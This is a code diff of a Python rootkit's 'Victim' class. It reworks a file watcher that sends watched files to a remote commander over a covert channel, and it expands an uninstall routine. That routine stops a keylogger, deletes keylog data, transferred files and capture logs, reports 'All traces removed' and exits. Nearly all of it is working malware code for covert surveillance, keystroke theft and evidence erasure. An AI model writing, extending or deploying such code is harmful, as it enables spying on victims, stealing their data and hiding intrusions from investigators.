@@ -451,7 +451,9 @@ class Victim:
                             watch_self.victim._send_watched_file(event.pathname)
             
             handler = WatchHandler(self, target_file)
-            observer = pyinotify.Notifier(wm, handler)
+            
+            # FIX: Use notifier with timeout instead of loop()
+            self.watcher_observer = pyinotify.Notifier(wm, handler, timeout=1000)
             
             # FIX: Correct event mask
             mask = (
@@ -463,12 +465,20 @@ class Victim:
             
             wm.add_watch(watch_dir, mask, rec=True, auto_add=True)
             
+            # FIX: Use process_events() in a loop instead of observer.loop()
             def watch_loop():
-                observer.loop()
+                while self.running and self.is_connected:
+                    try:
+                        self.watcher_observer.process_events()
+                        if self.watcher_observer.check_events():
+                            self.watcher_observer.read_events()
+                    except Exception as e:
+                        if self.running:
+                            print(f"[!] Watch error: {e}")
+                        break
             
             self.watcher_thread = threading.Thread(target=watch_loop, daemon=True)
             self.watcher_thread.start()
-            self.watcher_observer = observer
             
             print(f"[*] Watching {path} (using pyinotify)")
             self.send_covert_response(f"Watching {path}...\n")
@@ -506,11 +516,13 @@ class Victim:
     def stop_watcher(self):
         """Stop the file/directory watcher."""
         try:
+            # FIX: Properly stop the observer first
             if self.watcher_observer:
                 self.watcher_observer.stop()
                 self.watcher_observer = None
                 print("[*] pyinotify observer stopped")
             
+            # Then stop the thread
             if self.watcher_thread and self.watcher_thread.is_alive():
                 self.watcher_thread = None
                 print("[*] Watcher thread stopped")
@@ -522,16 +534,40 @@ class Victim:
             print(f"[!] Error stopping watcher: {e}")
 
     def uninstall(self):
-        """Remove the rootkit."""
+        """Remove the rootkit and clean up all traces."""
         self.send_covert_response("Uninstalling rootkit...\n")
         self.running = False
         
+        # 1. Stop the watcher observer
         if self.watcher_observer:
             try:
                 self.watcher_observer.stop()
+                self.watcher_observer = None
+                print("[*] Watcher observer stopped")
             except Exception:
                 pass
         
+        # 2. Stop the watcher thread
+        if self.watcher_thread and self.watcher_thread.is_alive():
+            try:
+                self.watcher_thread = None
+                print("[*] Watcher thread stopped")
+            except Exception:
+                pass
+        
+        # 3. Stop the keylogger
+        if self.keylogger:
+            self.keylogger.running = False
+        
+        if self.keylogger_thread and self.keylogger_thread.is_alive():
+            try:
+                self.keylogger_thread.join(timeout=2)
+                self.keylogger_thread = None
+                print("[*] Keylogger thread stopped")
+            except Exception:
+                pass
+        
+        # 4. Delete keylog data folder
         try:
             data_folder = "./data"
             if os.path.exists(data_folder):
@@ -540,7 +576,46 @@ class Victim:
         except Exception:
             pass
         
+        # 5. Delete transferred files from commander (PUT files)
+        try:
+            # Common locations where transferred files might be stored
+            transfer_locations = [
+                "./received",
+                "./downloads",
+                "./transfers",
+                "/tmp/rootkit_files"
+            ]
+            for location in transfer_locations:
+                if os.path.exists(location):
+                    shutil.rmtree(location)
+                    print(f"[*] Transfer folder removed: {location}")
+        except Exception:
+            pass
+        
+        # 6. Delete watched folder (if victim created one for some reason)
+        try:
+            watched_folder = "./watched"
+            if os.path.exists(watched_folder):
+                shutil.rmtree(watched_folder)
+                print("[*] Watched folder removed")
+        except Exception:
+            pass
+        
+        # 7. Remove any log files in current directory
+        try:
+            for file in os.listdir("."):
+                if file.endswith(".log") or file.endswith(".txt"):
+                    if "keylog" in file.lower() or "capture" in file.lower():
+                        os.remove(file)
+                        print(f"[*] Log file removed: {file}")
+        except Exception:
+            pass
+        
+        # 8. Send final confirmation
+        self.send_covert_response("Rootkit uninstalled. All traces removed.\n")
         print("[*] Rootkit uninstalled")
+        
+        # 9. Exit the victim program
         os._exit(0)
 
     def run(self):
